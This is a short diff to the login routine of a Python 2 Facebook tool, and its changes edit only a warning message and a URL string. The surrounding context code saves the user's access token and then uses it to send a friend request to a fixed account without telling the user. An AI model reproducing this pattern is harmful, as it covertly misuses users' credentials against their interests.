@@ -108,7 +108,7 @@ def login():
 		print logo
      	
 		
-		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mUse an Old New Account To Login' )
+		jalan(' \033[1;97m   ✧ \033[1;97mWarning: \033[1;97mUse a New Account To Login' )
 		jalan(' \033[1;97m   ✧ \033[1;97m👉 : \033[1;97mSam Oke Of Facebook' ) 
 		
 		print('	' )
@@ -142,7 +142,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;97mSuccessfully Logged In'
-				os.system('xdg-open https://www.youtube.com/channel/UCz5pc0t3AW8a1mPOx8wpjZg ')
+				os.system('xdg-open https://www.youtube.com/channel/UCz5pc0t3AW8a1mPOx8wpjZg')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
